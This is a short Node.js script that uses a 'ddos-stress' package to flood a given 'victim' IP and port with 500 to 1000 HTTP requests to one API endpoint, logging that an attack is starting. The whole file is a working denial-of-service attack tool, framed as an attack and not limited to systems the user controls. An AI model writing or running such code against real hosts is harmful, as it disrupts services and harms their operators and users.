var stress = require('ddos-stress');
var requests = require('faker').random.number({min:500, max:1000});

var chaos = new stress();
var args = process.argv.slice(2);
var victimIp = args[0];
var victimPort = args[1];

console.log(`Starting attack on ${victimIp} with ${requests} requests.`);
chaos.run(`http://${victimIp}:${victimPort}/api/study/load/1`,requests);